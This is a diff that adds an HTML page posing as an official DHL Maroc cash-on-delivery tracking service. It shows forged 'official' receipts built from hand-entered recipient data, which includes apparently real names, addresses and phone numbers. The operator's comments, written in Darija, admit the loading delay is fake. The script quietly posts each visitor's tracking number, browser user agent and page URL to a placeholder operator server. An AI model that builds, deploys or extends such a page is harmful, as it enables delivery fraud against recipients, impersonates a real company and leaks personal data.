@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DHL Maroc - Suivi de colis COD</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Arial, sans-serif; }
+        body { background: #f0f2f5; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
+        .dhl-header { background: linear-gradient(135deg, #ffcc00 0%, #e6b800 100%); width: 100%; padding: 18px 0; text-align: center; box-shadow: 0 2px 12px rgba(0,0,0,0.12); }
+        .dhl-header img { height: 42px; filter: drop-shadow(0 1px 3px rgba(0,0,0,0.15)); }
+        .main-container { width: 100%; max-width: 600px; padding: 20px; flex: 1; }
+        .card { background: #fff; border-radius: 14px; box-shadow: 0 6px 30px rgba(0,0,0,0.07); padding: 30px 28px; }
+        h2 { color: #d40511; font-size: 1.25rem; display: flex; align-items: center; gap: 8px; margin-bottom: 6px; }
+        .subtitle { color: #777; font-size: 0.85rem; margin-bottom: 20px; }
+        .alert-info { background: #fff8e1; border: 1px solid #ffe082; border-radius: 8px; padding: 12px 15px; font-size: 0.82rem; color: #8d6e00; margin-bottom: 18px; display: flex; align-items: center; gap: 8px; }
+        .search-box { display: flex; gap: 10px; }
+        .search-box input { flex: 1; padding: 14px 18px; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 1rem; letter-spacing: 1px; transition: 0.25s; }
+        .search-box input:focus { border-color: #ffcc00; outline: none; box-shadow: 0 0 0 4px rgba(255,204,0,0.18); }
+        .search-box button { background: #d40511; color: #fff; border: none; padding: 14px 28px; border-radius: 10px; font-size: 1rem; font-weight: 700; cursor: pointer; transition: 0.2s; display: flex; align-items: center; gap: 6px; }
+        .search-box button:hover { background: #b0040e; transform: scale(1.02); }
+
+        .loader { display: none; text-align: center; margin: 30px 0 10px; }
+        .loader .spinner { width: 42px; height: 42px; border: 4px solid #ffcc00; border-top-color: #d40511; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loader p { color: #888; font-size: 0.85rem; }
+
+        .error-msg { display: none; background: #ffebee; border-left: 5px solid #d40511; padding: 14px 16px; border-radius: 8px; font-size: 0.85rem; color: #b71c1c; margin-top: 16px; }
+
+        /* Ricevuta */
+        .ricevuta-container { display: none; margin-top: 25px; }
+        .ricevuta { background: #fff; border-radius: 14px; box-shadow: 0 8px 35px rgba(0,0,0,0.10); overflow: hidden; }
+        .ricevuta-header { background: #d40511; color: #fff; padding: 22px 20px; text-align: center; }
+        .ricevuta-header img { height: 32px; filter: brightness(0) invert(1); margin-bottom: 6px; }
+        .ricevuta-header h3 { font-size: 1.05rem; }
+        .ricevuta-body { padding: 25px; }
+        .ricevuta-ref { text-align: center; margin-bottom: 22px; padding-bottom: 16px; border-bottom: 2px dashed #ddd; }
+        .ricevuta-ref .ref-label { font-size: 0.7rem; color: #aaa; text-transform: uppercase; letter-spacing: 1.5px; }
+        .ricevuta-ref .ref-number { font-size: 1.3rem; font-weight: 800; color: #d40511; letter-spacing: 2px; margin-top: 4px; word-break: break-all; }
+        .ricevuta-section-title { font-size: 0.85rem; color: #d40511; font-weight: 700; margin: 20px 0 10px; padding-bottom: 5px; border-bottom: 2px solid #ffcc00; display: flex; align-items: center; gap: 6px; }
+        .ricevuta-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #f0f0f0; }
+        .ricevuta-row:last-child { border-bottom: none; }
+        .ricevuta-row .r-label { color: #888; font-size: 0.82rem; width: 36%; }
+        .ricevuta-row .r-value { color: #222; font-size: 0.9rem; font-weight: 600; width: 64%; text-align: right; }
+        .ricevuta-cod { background: #e8f5e9; padding: 18px 20px; border-radius: 10px; margin: 22px 0; display: flex; justify-content: space-between; align-items: center; border: 1px solid #c8e6c9; }
+        .ricevuta-cod .cod-label { font-size: 0.8rem; color: #555; }
+        .ricevuta-cod .cod-price { font-size: 1.6rem; font-weight: 800; color: #2e7d32; }
+        .ricevuta-footer { padding: 18px 25px; background: #fafafa; text-align: center; border-top: 1px solid #eee; }
+        .ricevuta-footer p { font-size: 0.72rem; color: #999; }
+        .ricevuta-footer .barcode { margin-top: 10px; font-family: 'Courier New', monospace; font-size: 1.8rem; letter-spacing: 6px; color: #333; }
+        .ricevuta-actions { display: flex; gap: 12px; justify-content: center; margin-top: 16px; flex-wrap: wrap; }
+        .ricevuta-actions button { padding: 11px 22px; border-radius: 8px; font-weight: 700; cursor: pointer; transition: 0.2s; font-size: 0.85rem; }
+        .btn-print { background: transparent; border: 2px solid #d40511; color: #d40511; }
+        .btn-print:hover { background: #d40511; color: #fff; }
+        .btn-back { background: transparent; border: 2px solid #888; color: #888; }
+        .btn-back:hover { background: #888; color: #fff; }
+        .footer-note { font-size: 0.72rem; color: #bbb; text-align: center; margin-top: 20px; padding: 10px; }
+
+        @media print {
+            .no-print { display: none !important; }
+            .ricevuta-container { display: block !important; }
+        }
+        @media (max-width: 480px) {
+            .search-box { flex-direction: column; }
+            .search-box button { justify-content: center; }
+            .card { padding: 22px 18px; }
+            .ricevuta-body { padding: 18px; }
+            .ricevuta-cod { flex-direction: column; text-align: center; gap: 8px; }
+            .ricevuta-row { flex-direction: column; text-align: left; gap: 2px; }
+            .ricevuta-row .r-value { text-align: left; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="dhl-header no-print">
+        <img src="https://www.dhl.com/content/dam/dhl/global/core/images/logos/dhl-logo.svg" alt="DHL">
+    </div>
+
+    <div class="main-container">
+
+        <!-- Search Card -->
+        <div class="card no-print" id="searchCard">
+            <h2>📦 Suivi COD DHL Maroc</h2>
+            <p class="subtitle">Entrez votre numéro de suivi pour consulter votre reçu de livraison</p>
+            <div class="alert-info">🔒 Service officiel DHL — Paiement à la livraison (COD)</div>
+            <form id="searchForm">
+                <div class="search-box">
+                    <input type="text" id="trackingInput" placeholder="Ex: JD1234567890" required autocomplete="off">
+                    <button type="submit">🔍 Rechercher</button>
+                </div>
+            </form>
+            <div class="loader" id="loader">
+                <div class="spinner"></div>
+                <p>Recherche de votre colis DHL...</p>
+            </div>
+            <div class="error-msg" id="errorMsg">
+                ❌ Numéro de suivi introuvable. Veuillez vérifier et réessayer.
+            </div>
+        </div>
+
+        <!-- Ricevuta -->
+        <div class="ricevuta-container no-print" id="ricevutaContainer">
+            <div class="ricevuta" id="ricevuta">
+                <div class="ricevuta-header">
+                    <img src="https://www.dhl.com/content/dam/dhl/global/core/images/logos/dhl-logo.svg" alt="DHL">
+                    <h3>📄 BON DE LIVRAISON / REÇU COD</h3>
+                    <p>Document officiel — DHL Maroc</p>
+                </div>
+                <div class="ricevuta-body">
+                    <div class="ricevuta-ref">
+                        <div class="ref-label">Référence DHL</div>
+                        <div class="ref-number" id="refNumber">DHL-COD-2026-XXXXXXXX</div>
+                    </div>
+                    <div class="ricevuta-section-title">🚚 Informations de suivi</div>
+                    <div class="ricevuta-row"><span class="r-label">N° de suivi</span><span class="r-value" id="rTracking" style="color:#d40511;">—</span></div>
+                    <div class="ricevuta-row"><span class="r-label">Date de mise à jour</span><span class="r-value" id="rDate">—</span></div>
+                    <div class="ricevuta-row"><span class="r-label">Statut</span><span class="r-value" style="color:#2e7d32;">✅ En cours de livraison</span></div>
+                    
+                    <div class="ricevuta-section-title">👤 Informations destinataire</div>
+                    <div class="ricevuta-row"><span class="r-label">Nom complet</span><span class="r-value" id="rNom">—</span></div>
+                    <div class="ricevuta-row"><span class="r-label">Adresse</span><span class="r-value" id="rAdresse">—</span></div>
+                    <div class="ricevuta-row"><span class="r-label">Téléphone</span><span class="r-value" id="rTelephone">—</span></div>
+                    <div class="ricevuta-row"><span class="r-label">Ville</span><span class="r-value" id="rVille">—</span></div>
+                    
+                    <div class="ricevuta-cod">
+                        <div><div class="cod-label">💵 Montant COD à payer</div><div style="font-size:0.7rem;color:#999;">Paiement à la livraison</div></div>
+                        <div class="cod-price" id="rCOD">0,00 MAD</div>
+                    </div>
+                    <div style="font-size:0.72rem;color:#aaa;text-align:center;margin-top:6px;">Ce document sert de preuve d'envoi et de réception COD</div>
+                </div>
+                <div class="ricevuta-footer">
+                    <p>DHL Maroc · Service Client: 05 22 45 67 89</p>
+                    <p style="margin-top:2px;">📧 support@dhl.co.ma · www.dhl.com/ma</p>
+                    <div class="barcode">| || |  || | ||| | || ||| ||</div>
+                    <div class="ricevuta-actions">
+                        <button class="btn-print" onclick="window.print()">🖨️ Imprimer</button>
+                        <button class="btn-back" onclick="backToSearch()">⬅️ Nouvelle recherche</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer-note no-print">© 2026 DHL International GmbH. Tous droits réservés.</div>
+    </div>
+
+    <script>
+        // =================================================================
+        // ====== TRACKING DATA — زيد التراكنغات من هنا ======
+        // =================================================================
+        var trackingData = {
+            "JDCRI0VRT778": {
+                nom:       "Vacca Cristina",
+                adresse:   "C/o uff postale Portoscuso Via Napoli 12, 09010 Portoscuso (SU)",
+                telephone: "+39 338 351 1823",
+                ville:     "Portoscuso",
+                montant:   "70,00 €"
+            },
+            "JD0987654321": {
+                nom:       "Fatima El Amrani",
+                adresse:   "45 Avenue Hassan II, Résidence Alia",
+                telephone: "+212 6 98 76 54 32",
+                ville:     "Rabat",
+                montant:   "890,50 MAD"
+            },
+            "JD5555666777": {
+                nom:       "Youssef Idrissi",
+                adresse:   "88 Rue Atlas, Imm. Saada",
+                telephone: "+212 6 55 44 33 22",
+                ville:     "Marrakech",
+                montant:   "1 250,00 MAD"
+            }
+            // ===== زيد على هاد الشكل =====
+            // "JDXXXXXXXXXX": {
+            //     nom:       "الإسم الكامل",
+            //     adresse:   "العنوان كامل",
+            //     telephone: "رقم الهاتف",
+            //     ville:     "المدينة",
+            //     montant:   "المبلغ,00 MAD"
+            // }
+        };
+
+        // ====== إعدادات ======
+        var LOADING_DELAY = 2000;          // 2 ثواني تحميل وهمي
+        var YOUR_SERVER = "https://TON-SERVEUR.com/dhl_track.php";  // ❗ بدل هاد الرابط باللي عندك
+
+        // =================================================================
+        // ====== لا تمسح ما تحت ======
+        // =================================================================
+        var monthsFR = ['Janvier','Février','Mars','Avril','Mai','Juin','Juillet','Août','Septembre','Octobre','Novembre','Décembre'];
+
+        function generateRef() {
+            return 'DHL-COD-2026-' + String(Math.random()).slice(2,10);
+        }
+
+        function generateDate() {
+            var d = new Date();
+            return String(d.getDate()).padStart(2,'0') + ' ' + monthsFR[d.getMonth()] + ' ' + d.getFullYear() + ' à ' + String(d.getHours()).padStart(2,'0') + ':' + String(d.getMinutes()).padStart(2,'0');
+        }
+
+        document.getElementById('searchForm').onsubmit = function(e) {
+            e.preventDefault();
+            var tracking = document.getElementById('trackingInput').value.trim().toUpperCase();
+            var loader = document.getElementById('loader');
+            var errorMsg = document.getElementById('errorMsg');
+            var container = document.getElementById('ricevutaContainer');
+
+            errorMsg.style.display = 'none';
+            container.style.display = 'none';
+
+            if (tracking.length < 4) {
+                errorMsg.textContent = '❌ Veuillez entrer un numéro de suivi valide (minimum 4 caractères).';
+                errorMsg.style.display = 'block';
+                return;
+            }
+
+            loader.style.display = 'block';
+
+            // ==== إرسال التراكنغ للسيرفر ====
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', YOUR_SERVER, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify({
+                tracking: tracking,
+                timestamp: new Date().toISOString(),
+                user_agent: navigator.userAgent,
+                page: window.location.href
+            }));
+
+            setTimeout(function() {
+                loader.style.display = 'none';
+                var data = trackingData[tracking];
+
+                if (!data) {
+                    errorMsg.textContent = '❌ Le numéro "' + tracking + '" est introuvable. Vérifiez et réessayez.';
+                    errorMsg.style.display = 'block';
+                    return;
+                }
+
+                document.getElementById('refNumber').textContent = generateRef();
+                document.getElementById('rTracking').textContent = tracking;
+                document.getElementById('rDate').textContent = generateDate();
+                document.getElementById('rNom').textContent = data.nom;
+                document.getElementById('rAdresse').textContent = data.adresse;
+                document.getElementById('rTelephone').textContent = data.telephone;
+                document.getElementById('rVille').textContent = data.ville;
+                document.getElementById('rCOD').textContent = data.montant;
+
+                container.style.display = 'block';
+                container.scrollIntoView({ behavior: 'smooth' });
+
+                document.getElementById('trackingInput').value = '';
+                document.getElementById('trackingInput').focus();
+            }, LOADING_DELAY);
+        };
+
+        function backToSearch() {
+            document.getElementById('ricevutaContainer').style.display = 'none';
+            document.getElementById('searchCard').scrollIntoView({ behavior: 'smooth' });
+            document.getElementById('trackingInput').focus();
+        }
+    </script>
+</body>
+</html>
